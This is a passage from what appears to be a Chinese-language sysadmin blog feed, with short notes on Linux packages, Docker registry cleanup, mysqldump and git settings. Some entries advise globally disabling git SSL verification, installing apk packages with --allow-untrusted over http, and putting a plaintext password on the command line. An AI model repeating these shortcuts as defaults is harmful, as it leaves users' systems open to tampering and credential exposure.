        <content type="html"><![CDATA[<p>linux 下字体安装可以通过软件包的方式安装，例如 </p><blockquote><p>yum fonts-wqy-zenhei</p></blockquote><p>另外可以使用 ttf 和 ttc 字体文件安装</p><p>安装 fontconfig 管理字体，然后将 ttf 和 ttc 文件拷贝到 /usr/share/fonts 目录下，最后更新字体缓存即可。</p><h2 id="字体安装相关命令"><a href="#字体安装相关命令" class="headerlink" title="字体安装相关命令"></a>字体安装相关命令</h2><p>安装 fontconfig</p><blockquote><p>yum install -y fontconfig mkfontscale</p></blockquote><p>查看已经安装的字体</p><blockquote><p>fc-list</p></blockquote><p>查看中文字体</p><blockquote><p>fc-list :lang=zh</p></blockquote><p>拷贝字体 </p><blockquote><p>mv simsun.ttf /usr/share/fonts</p></blockquote><p>执行安装字体，并更新缓存 </p><blockquote><p>mkfontscale &amp;&amp; mkfontdir &amp;&amp; fc-cache</p></blockquote><p>使用 fc-list :lang=zh 可以验证</p><p>如果过程中安装不顺利，可能需要赋权</p><blockquote><p>chmod a+r simsun.ttc</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>linux安装中文字体 <a href="https://jingyan.baidu.com/article/0eb457e5d4a48703f0a90565.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/0eb457e5d4a48703f0a90565.html</a></li><li>docker alpine版本服务中显示中文 <a href="https://www.wencst.com/archives/711" target="_blank" rel="noopener">https://www.wencst.com/archives/711</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Docker Alpine 使用科大源</title>
      <link href="/docker/docker/docker-change-alpine-repo/"/>
      <url>/docker/docker/docker-change-alpine-repo/</url>
      
        <content type="html"><![CDATA[<h2 id="使用科大源-http-mirrors-ustc-edu-cn"><a href="#使用科大源-http-mirrors-ustc-edu-cn" class="headerlink" title="使用科大源  http://mirrors.ustc.edu.cn"></a>使用科大源  <a href="http://mirrors.ustc.edu.cn" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn</a></h2><blockquote><p>sed -i ‘s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g’ /etc/apk/repositories</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Alpine apk 命令</title>
      <link href="/docker/docker/docker-alpine/"/>
      <url>/docker/docker/docker-alpine/</url>
      
        <content type="html"><![CDATA[<h2 id="关于-Alpine"><a href="#关于-Alpine" class="headerlink" title="关于 Alpine"></a>关于 Alpine</h2><p>Alpine Linux是一个面向安全应用的轻量级Linux发行版。它采用了musl libc和busybox以减小系统的体积和运行时资源消耗，同时还提供了自己的包管理工具apk。</p><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><p>alpine 提供了非常好用的apk软件包管理工具</p><h3 id="apk-update"><a href="#apk-update" class="headerlink" title="apk update"></a>apk update</h3><p>update：从远程镜像源中更新本地镜像源索引。</p><p>update命令会从各个镜像源列表下载APKINDEX.tar.gz并存储到本地缓存，一般在/var/cache/apk/(Alpine在该目录下)、/var/lib/apk/ 、/etc/apk/cache/下。</p><h3 id="apk-add"><a href="#apk-add" class="headerlink" title="apk add"></a>apk add</h3><p>add：安装PACKAGES并自动解决依赖关系。</p><p>add命令从仓库中安装最新软件包，并自动安装必须的依赖包，也可以从第三方仓库添加软件包。</p><pre><code>$ apk add openssh openntp vim$ apk add --no-cache mysql-client$ apk add docker --update-cache --repository http://mirrors.ustc.edu.cn/alpine/v3.4/main/ --allow-untrusted</code></pre><p>安装指定版本软件包</p><pre><code>apk add asterisk=1.6.0.21-r0$ apk add &#39;asterisk&lt;1.6.1&#39;$ apk add &#39;asterisk&gt;1.6.1</code></pre><h3 id="apk-del"><a href="#apk-del" class="headerlink" title="apk del"></a>apk del</h3><p>del：卸载并删除PACKAGES</p><blockquote><p>apk del openssh openntp vim</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 dpkg 安装 deb包</title>
      <link href="/linux/linux/linux-dpkg/"/>
      <url>/linux/linux/linux-dpkg/</url>
      
        <content type="html"><![CDATA[<h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><blockquote><p>dpkg -i 安装包</p></blockquote><p>借助 apt-get 解决依赖</p><blockquote><p>apt-get update &amp;&amp; apt-get -f install </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux yum</title>
      <link href="/linux/linux/linux-yum/"/>
      <url>/linux/linux/linux-yum/</url>
      
        <content type="html"><![CDATA[<h2 id="常见的-yum-使用"><a href="#常见的-yum-使用" class="headerlink" title="常见的 yum 使用"></a>常见的 yum 使用</h2><ol><li>添加源</li></ol><p>例如 docker ce</p><blockquote><p>wget <a href="https://download.docker.com/linux/centos/docker-ce.repo" target="_blank" rel="noopener">https://download.docker.com/linux/centos/docker-ce.repo</a><br>mv docker-ce.repo /ect/yum.repo.d/</p></blockquote><ol start="2"><li>显示软件的可选版本 </li></ol><p>例如显示出 docker 的各个版本</p><blockquote><p>yum list docker-ce –showduplicates | sort -r</p></blockquote><pre><code>```</code></pre><p>docker-ce.aarch64            3:19.03.5-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.4-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.3-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.2-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.1-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:19.03.0-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.9-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.8-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.7-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.6-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.5-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.4-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.3-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.2-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.1-3.el7                    docker-ce-stable<br>docker-ce.aarch64            3:18.09.0-3.el7                    docker-ce-stable<br>docker-ce.aarch64            18.06.3.ce-3.el7                   docker-ce-stable<br>docker-ce.aarch64            18.06.2.ce-3.el7                   docker-ce-stable<br>docker-ce.aarch64            18.06.1.ce-3.el7                   docker-ce-stable<br>docker-ce.aarch64            18.06.0.ce-3.el7.centos            docker-ce-stable<br>docker-ce.aarch64            18.03.1.ce-1.el7.centos            docker-ce-stable<br>docker-ce.aarch64            18.03.0.ce-1.el7.centos            docker-ce-stable<br>    <code>`</code></p><p>第二列中，冒号到第一个中横线才是版本号，安装指定版本： </p><blockquote><p>sudo yum install docker-ce-docker-ce-18.09.1 docker-ce-cli-docker-ce-18.09.1 containerd.io</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>AArch64 是什么</title>
      <link href="/ARM/arm/arm-64/"/>
      <url>/ARM/arm/arm-64/</url>
      
        <content type="html"><![CDATA[<p>AArch64是ARMv8 架构的一种执行状态。</p><p>为了更广泛地向企业领域推进，需要引入 64 位构架。同时也需要在 ARMv8 架构中引入新的 AArch64 执行状态。AArch64 不是一个单纯的 32 位 ARM 构架扩展，而是 ARMv8 内全新的构架，完全使用全新的 A64 指令集。这些都源自于多年对现代构架设计的深入研究。更重要的是， AArch64 作为一个分离出的执行状态，意味着一些未来的处理器可能不支持旧的 AArch32 执行状态。 虽然最初的 64 位 ARM 处理器将会完全向后兼容，但我们大胆且前瞻性地将 AArch64 作为在 ARMv8 处理器中唯一的执行状态。我们在这些系统中将不支持 32 位执行状态， 这将使许多有益的实现得到权衡，如默认情况下，使用一个较大的 64K 大小的页面，并会使得纯净的 64 位 ARM 服务器系统不受遗留代码的影响。立即进行这种划分是很重要的，因为有可能在未来几年内将出现仅支持 64 位的服务器系统。没有必要在新的 64 位架构中去实现一个完整的 32 位流水线，这将会提高未来 ARM 服务器系统的能效。这样回想起来， AArch64 作为在 Fedora ARM 项目中被支持的 ARM 构架是一个很自然的过程： armv5tel、armv7hl、aarch64。新的架构被命名为：aarch64，这同 ARM 自己选择的主线命名方式保持一致，同时也考虑到了 ARM 架构名与 ARM 商标分开的期望。</p>]]></content>
      
      
      <categories>
          
          <category> ARM </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>EulerOS 安装 Nodejs（ARM版本）</title>
      <link href="/ARM/arm/install-nodejs-on-arm/"/>
      <url>/ARM/arm/install-nodejs-on-arm/</url>
      
        <content type="html"><![CDATA[<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><ol><li>通过Linux系统命令【uname -a】 查看操作系统位数（备注：x86_64表示X86处理器64位系统， aarch64表示ARM处理器64位系统）</li><li>去官网下载ARMv8版本的压缩包（Jetson TX1的处理器是ARM57，基于ARMv8的核）<br>英文网址：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">https://nodejs.org/en/download/</a></li><li>下载解压后建立软连接 </li></ol><blockquote><p>ln -s ~/program/nodejs/bin/npm /usr/local/bin/<br>ln -s ~/program/nodejs/bin/node /usr/local/bin/</p></blockquote><p>检查是否有效</p><blockquote><p>node -v</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ARM </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>puppeteer 例子</title>
      <link href="/nodejs/nodejs/puppeteer/"/>
      <url>/nodejs/nodejs/puppeteer/</url>
      
        <content type="html"><![CDATA[<pre><code>const puppeteer = require(&#39;puppeteer&#39;);(async() =&gt; {    const browser = await puppeteer.launch({        executablePath:&#39;/usr/bin/chromium-browser&#39;,        args: [            &#39;--no-sandbox&#39;,            &#39;--disable-setuid-sandbox&#39;        ]    });    const page = await browser.newPage();    await page.goto(&#39;https://www.google.com/&#39;, {waitUntil: &#39;networkidle2&#39;});    browser.close();})();</code></pre><h2 id="使用容器启动"><a href="#使用容器启动" class="headerlink" title="使用容器启动"></a>使用容器启动</h2><ul><li><a href="https://hub.docker.com/r/supernisor/armv7-puppeteer" target="_blank" rel="noopener">https://hub.docker.com/r/supernisor/armv7-puppeteer</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker 部署机器上镜像清理</title>
      <link href="/docker/docker/docker-clean/"/>
      <url>/docker/docker/docker-clean/</url>
      
        <content type="html"><![CDATA[<blockquote><p>docker rmi $(docker images –filter “dangling=true” -q) &amp;</p></blockquote><p>添加到脚本</p><blockquote><p>vim /root/crontab/images_clean.sh</p></blockquote><p>写入 crontab</p><pre><code>0 0 * * * /root/crontab/images_clean.sh 1&gt;/dev/null 2&gt;&amp;1 &amp;</code></pre>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker 自带镜像仓库清理</title>
      <link href="/docker/docker/docker-registry-clean/"/>
      <url>/docker/docker/docker-registry-clean/</url>
      
        <content type="html"><![CDATA[<p>Docker存储使用的aufs文件系统分层存储结构,将容器文件以读写分层的形式存储在宿主机中。自带的镜像仓库删除比较麻烦，需要调用 API 删除，然后进入容器执行。</p><h2 id="手动删除"><a href="#手动删除" class="headerlink" title="手动删除"></a>手动删除</h2><p>进入 registry 容器</p><blockquote><p>vim /etc/docker/registry/config.yml</p></blockquote><p>添加配置</p><pre><code>storage:  delete:    enabled: true</code></pre><p>重启 registry</p><p>调用 API 获取所有镜像仓库 </p><blockquote><p>curl <a href="http://host:5000/v2/_catalog" target="_blank" rel="noopener">http://host:5000/v2/_catalog</a></p></blockquote><p>获取仓库标签</p><blockquote><p>curl <a href="http://host:5000/v2/app-frontend/tags/list" target="_blank" rel="noopener">http://host:5000/v2/app-frontend/tags/list</a></p></blockquote><p>获取标签对应的digest</p><blockquote><p>curl <a href="http://host:5000/v2/app-frontend/manifests/v1" target="_blank" rel="noopener">http://host:5000/v2/app-frontend/manifests/v1</a></p></blockquote><p>注意： 必须配置 Header Accept: application/vnd.docker.distribution.manifest.v2+json，否则获取的值不对</p><p>注意看前面操作返回值的 Header，使用 Docker-Content-Digest 的完整值，包含 sha256: 前缀。</p><p>删除 manifest </p><blockquote><p>curl <a href="http://host:5000/v2/app-frontend/manifests/sha256:1234455" target="_blank" rel="noopener">http://host:5000/v2/app-frontend/manifests/sha256:1234455</a> -X DELETE</p></blockquote><p>调用API清理后，进入容器，清理磁盘空间</p><p>清理空间</p><blockquote><p>registry garbage-collect /etc/docker/registry/config.yml</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p>参考 API <a href="https://docs.docker.com/registry/spec/api" target="_blank" rel="noopener">https://docs.docker.com/registry/spec/api</a><br>单个清理过程 <a href="https://blog.csdn.net/isea533/article/details/87622213" target="_blank" rel="noopener">https://blog.csdn.net/isea533/article/details/87622213</a><br>批量清理 <a href="https://blog.csdn.net/ywq935/article/details/83828888" target="_blank" rel="noopener">https://blog.csdn.net/ywq935/article/details/83828888</a></p></blockquote><h2 id="网友编写的自动调API的-python2-7-脚本"><a href="#网友编写的自动调API的-python2-7-脚本" class="headerlink" title="网友编写的自动调API的 python2.7 脚本"></a>网友编写的自动调API的 python2.7 脚本</h2><pre><code>import requestsfrom concurrent.futures import ThreadPoolExecutorclass Docker(object):    def __init__(self, hub, repos):        self.hub = hub        self.repos = repos    @staticmethod    def get_tag_list(hub, repo):        # 获取这个repo的所有tags        tag_list_url = &#39;%s/v2/%s/tags/list&#39; % (hub, repo)        r1 = requests.get(url=tag_list_url)        tag_list = r1.json().get(&#39;tags&#39;)        return tag_list    def main(self):        thpool = ThreadPoolExecutor(10)        for repo in self.repos:            thpool.submit(self.delete_images, repo)        thpool.shutdown(wait=True)    def delete_images(self, repo):        hub = self.hub        tag_list = self.get_tag_list(hub=hub, repo=repo)        num = 0        try:            # 保留最后两个版本的镜像            for tag in tag_list[:-2]:                # 获取image digest摘要信息                get_info_url = &#39;{}/v2/{}/manifests/{}&#39;.format(hub, repo, tag)                header = {&quot;Accept&quot;: &quot;application/vnd.docker.distribution.manifest.v2+json&quot;}                r2 = requests.get(url=get_info_url, headers=header, timeout=10)                digest = r2.headers.get(&#39;Docker-Content-Digest&#39;)                # 删除镜像                delete_url = &#39;%s/v2/%s/manifests/%s&#39; % (hub, repo, digest)                r3 = requests.delete(url=delete_url)                if r3.status_code == 202:                    num += 1        except Exception as e:            print(str(e))        print(&#39;仓库%s 共删除了%i个历史镜像&#39; % (repo, num))if __name__ == &#39;__main__&#39;:    hub = &#39;http://registry.xxx.com:5000&#39;    repos = [&#39;zdtest&#39;, &#39;ordertest&#39;, &#39;bjdev&#39;, &#39;zhqtest&#39;, &#39;systemtest&#39;, &#39;zddev&#39;, &#39;bjtest&#39;, &#39;dsystemtest&#39;, &#39;tooltest&#39;]    d = Docker(hub=hub, repos=repos)    d.main()————————————————版权声明：本文为CSDN博主「ywq935」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/ywq935/article/details/83828888</code></pre>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 查看域名后所有的IP</title>
      <link href="/linux/linux/linux-dig/"/>
      <url>/linux/linux/linux-dig/</url>
      
        <content type="html"><![CDATA[<blockquote><p>dig <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 27655<br>;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1</p><p>;; OPT PSEUDOSECTION:<br>; EDNS: version: 0, flags:; udp: 4096<br>;; QUESTION SECTION:<br>;<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>.            IN    A</p><p>;; ANSWER SECTION:<br><a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>.        198    IN    CNAME    <a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a>.<br><a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a>.    371    IN    A    61.135.169.125<br><a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a>.    371    IN    A    61.135.169.121</p><p>;; Query time: 48 msec<br>;; SERVER: 10.202.4.4#53(10.202.4.4)<br>;; WHEN: Wed Jan 15 16:50:48 CST 2020<br>;; MSG SIZE  rcvd: 101</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql 数据导出</title>
      <link href="/mysql/mysql/mysqldump/"/>
      <url>/mysql/mysql/mysqldump/</url>
      
        <content type="html"><![CDATA[<h2 id="数据库导出"><a href="#数据库导出" class="headerlink" title="数据库导出"></a>数据库导出</h2><blockquote><p>mysqldump \<br>–column-statistics=0 \<br>–user=root \<br>–password=123456 \<br>–compatible=postgresql \<br>databasename</p></blockquote><p>PS 我用的 Mac Mysql workbench 带的 mysqldump 命令</p><blockquote><p>/Applications/MySQLWorkbench.app/Contents/MacOS/mysqldump \<br>–column-statistics=0 \<br>–user=root \<br>–password=123456 \<br>–compatible=postgresql \</p></blockquote><h2 id="查询结果导出"><a href="#查询结果导出" class="headerlink" title="查询结果导出"></a>查询结果导出</h2><pre><code>mysql&gt; SELECT * FROM runoob_tbl     -&gt; INTO OUTFILE &#39;/tmp/runoob.txt&#39;;</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>mysqldump 文档 <a href="https://dev.mysql.com/doc/refman/5.6/en/mysqldump.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.6/en/mysqldump.html</a> </li><li>select 到文件方法 <a href="https://www.runoob.com/mysql/mysql-database-export.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-database-export.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>统计代码行数</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/count-code-lines/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/count-code-lines/</url>
      
        <content type="html"><![CDATA[<p>可以使用 idea 的插件：Statistic</p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python 监听指定端口</title>
      <link href="/python/python/python-listen-port/"/>
      <url>/python/python/python-listen-port/</url>
      
        <content type="html"><![CDATA[<blockquote><p>python -m SimpleHTTPServer 2376</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Git 提交文件属性</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/git-commit-filemode/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/git-commit-filemode/</url>
      
        <content type="html"><![CDATA[<p>默认git提交的文件没有属性，例如执行权限</p><p>可以使用下面的命令</p><blockquote><p>git update-index –chmod=+x script.sh</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 文件和目录操作</title>
      <link href="/linux/linux/linux-file-and-path/"/>
      <url>/linux/linux/linux-file-and-path/</url>
      
        <content type="html"><![CDATA[<h2 id="几个特殊的相对目录"><a href="#几个特殊的相对目录" class="headerlink" title="几个特殊的相对目录"></a>几个特殊的相对目录</h2><ul><li>. 当前目录</li><li>.. 上一个目录</li><li>~ 家目录</li><li>~account 另外一个用户的家目录</li><li><code>-</code> 上一次的目录 </li></ul><h2 id="对目录的几个常见操作"><a href="#对目录的几个常见操作" class="headerlink" title="对目录的几个常见操作"></a>对目录的几个常见操作</h2><p>递归创建目录</p><blockquote><p>mkdir -p 目录名称</p></blockquote><p>递归删除目录</p><blockquote><p>rm -rf 目录名称</p></blockquote><h2 id="ls-的几个技巧"><a href="#ls-的几个技巧" class="headerlink" title="ls 的几个技巧"></a>ls 的几个技巧</h2><p>排序查看</p><blockquote><p>ls -S </p></blockquote><p>查看包含隐藏文件，以及详细信息</p><blockquote><p>ls -al </p></blockquote><p>格式化文件大小显示</p><blockquote><p>ls -h</p></blockquote><h2 id="cp-rm-mv-注意事项"><a href="#cp-rm-mv-注意事项" class="headerlink" title="cp rm mv 注意事项"></a>cp rm mv 注意事项</h2><p>复制文件全部属性，包括权限，否则会当做当前用户处理</p><blockquote><p>cp -a </p></blockquote><p>创建符号链接</p><blockquote><p>cp -s</p></blockquote><p>创建硬链接</p><blockquote><p>cp -l </p></blockquote><p>如果文件中有特殊字符，无法直接删除，可以使用 <code>./xxx</code> 的方式删除</p><blockquote><p>rm ./–xx.txt</p></blockquote><h2 id="获取路径的文件名和目录名称"><a href="#获取路径的文件名和目录名称" class="headerlink" title="获取路径的文件名和目录名称"></a>获取路径的文件名和目录名称</h2><p>获取文件名 network </p><blockquote><p>basename /etc/sysconfig/network</p></blockquote><p>获取目录 /etc/sysconfig</p><blockquote><p>dirname /etc/sysconfig/network</p></blockquote><h2 id="文本文件查看"><a href="#文本文件查看" class="headerlink" title="文本文件查看"></a>文本文件查看</h2><ul><li>cat 从第一行开始显示</li><li>tac 从最后一行开始显示</li><li>nl 输出并显示行号</li><li>more 分页显示文件内容</li><li>less 往前翻页</li><li>head 看前面几行</li><li>tail 看后面几行</li><li>od 使用二进制的方式读取</li></ul><p>文本查看时几个比较方便的命令</p><ul><li>空格：向下翻动一页</li><li>/ 向下查找</li><li>? 向上查找</li><li>n 重复前一个查找</li><li>N 反向上一个查找</li><li>g 前进到数据的第一行</li><li>G 前进到数据的最后一行</li><li>q 离开</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Maven 将本地 jar 打包到项目</title>
      <link href="/java/devops/maven-import-local-jar/"/>
      <url>/java/devops/maven-import-local-jar/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-install-到本地仓库的方案"><a href="#使用-install-到本地仓库的方案" class="headerlink" title="使用 install 到本地仓库的方案"></a>使用 install 到本地仓库的方案</h2><p>使用 mvn install 到本地，如果使用 CI 可以先于 mvn package 执行。</p><pre><code>mvn install:install-file \   -Dfile=&lt;path-to-file&gt; \   -DgroupId=&lt;group-id&gt; \   -DartifactId=&lt;artifact-id&gt; \   -Dversion=&lt;version&gt; \   -Dpackaging=&lt;packaging&gt; \   -DgeneratePom=true</code></pre><p>然后按照正常的方式引入依赖即可。</p><h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h2><p>systemPath 方式导入，但是这种方式，测试和本地运行可以，服务器运行会报找不到 class 的错误。</p><pre><code>&lt;dependency&gt;    &lt;groupId&gt;com.sample&lt;/groupId&gt;    &lt;artifactId&gt;sample&lt;/artifactId&gt;    &lt;version&gt;1.0&lt;/version&gt;    &lt;scope&gt;system&lt;/scope&gt;    &lt;systemPath&gt;${project.basedir}/src/main/resources/Name_Your_JAR.jar&lt;/systemPath&gt;&lt;/dependency&gt;</code></pre><p>这种方式需要将jar 包通过 resources 引入,现在使用maven 打包，虽然添加到仓库里了，但是打包后到boot-info lib里是找不到的。</p><pre><code>&lt;resources&gt;            &lt;resource&gt;                &lt;directory&gt;lib&lt;/directory&gt;                &lt;targetPath&gt;BOOT-INF/lib/&lt;/targetPath&gt;                &lt;includes&gt;                    &lt;include&gt;**/*.jar&lt;/include&gt;                &lt;/includes&gt;            &lt;/resource&gt;        &lt;/resources&gt;</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/guogenfang/article/details/53734826" target="_blank" rel="noopener">https://blog.csdn.net/guogenfang/article/details/53734826</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 项目密匙安全</title>
      <link href="/Spring/spring/springboot-credential/"/>
      <url>/Spring/spring/springboot-credential/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-Jenkis-的密匙管理"><a href="#使用-Jenkis-的密匙管理" class="headerlink" title="使用 Jenkis 的密匙管理"></a>使用 Jenkis 的密匙管理</h2><h2 id="使用分布式的密匙管理"><a href="#使用分布式的密匙管理" class="headerlink" title="使用分布式的密匙管理"></a>使用分布式的密匙管理</h2><h2 id="使用-ENC-对密码进行加密"><a href="#使用-ENC-对密码进行加密" class="headerlink" title="使用 ENC 对密码进行加密"></a>使用 ENC 对密码进行加密</h2><p>可以使用 jasypt 库对 yml 中的密码进行加密</p><p>参考地址 <a href="https://yq.aliyun.com/articles/182720?utm_content=m_29522" target="_blank" rel="noopener">https://yq.aliyun.com/articles/182720?utm_content=m_29522</a></p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 使用 alternatives 切换Java版本</title>
      <link href="/linux/linux/jdk-version/"/>
      <url>/linux/linux/jdk-version/</url>
      
        <content type="html"><![CDATA[<p>lternatives与update-alternatives好像是同一样工具（各个linux发行版使用的不一样）</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果 linux 机器上安装了多个 java 版本，需要切换。可以使用 alternatives。</p><p>原来是在/usr/bin目录下创建一个符号链接，指向/etc/alternatives/ 下的的文件，而该文件依然是一个符号链接。</p><pre><code>[root@node1 mec]# ll /usr/bin/java  lrwxrwxrwx. 1 root root 22 4月  16 16:06 /usr/bin/java -&gt; /etc/alternatives/java  </code></pre><h2 id="切换-java-版本"><a href="#切换-java-版本" class="headerlink" title="切换 java 版本"></a>切换 java 版本</h2><blockquote><p>alternatives –config java  </p></blockquote><pre><code>共有 3 个程序提供“java”。    选择    命令  -----------------------------------------------     1           /usr/lib/jvm/jre-1.5.0-gcj/bin/java  *  2           /usr/lib/jvm/jre-1.7.0-openjdk.x86_64/bin/java   + 3           /usr/java/default/bin/java  </code></pre><p>然后选择你想要选择的选项保存就好了</p><h2 id="添加的新的-java-版本到-alternatives-管理"><a href="#添加的新的-java-版本到-alternatives-管理" class="headerlink" title="添加的新的 java 版本到 alternatives 管理"></a>添加的新的 java 版本到 alternatives 管理</h2><blockquote><p>alternatives –install /usr/bin/java java /usr/lib/jdk1.8/bin/java 500  </p></blockquote><p>参数说明：</p><ul><li>/usr/bin/java java path 逻辑,会被 alternatives 软连接</li><li>java java 命令</li><li>/usr/lib/jdk1.8/bin/java 新的 java 版本目标地址</li><li>500 选择的时候的序号</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/ccfxue/article/details/53822740" target="_blank" rel="noopener">https://blog.csdn.net/ccfxue/article/details/53822740</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>忽略 git SSL 证书</title>
      <link href="/git/git/ignore-ssh-certificate/"/>
      <url>/git/git/ignore-ssh-certificate/</url>
      
        <content type="html"><![CDATA[<p>如果自己搭建的 gitlab 开启了自签名证书的 ssl，客户端拉取代码时候会报错</p><pre><code>error: SSL certificate problem, verify that the CA cert is OK. Details:error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed while accessing https://github.com/username/ExcelANT.git/info/refs</code></pre><p>全局关闭 ssl 验证</p><blockquote><p>git config –global http.sslVerify false</p></blockquote><p>当前仓库关闭 ssl 验证</p><blockquote><p>git config http.sslVerify false</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://stackoverflow.com/questions/3777075/ssl-certificate-rejected-trying-to-access-github-over-https-behind-firewall" target="_blank" rel="noopener">https://stackoverflow.com/questions/3777075/ssl-certificate-rejected-trying-to-access-github-over-https-behind-firewall</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker 容器导入导出</title>
      <link href="/docker/docker/docker-export/"/>
      <url>/docker/docker/docker-export/</url>
      
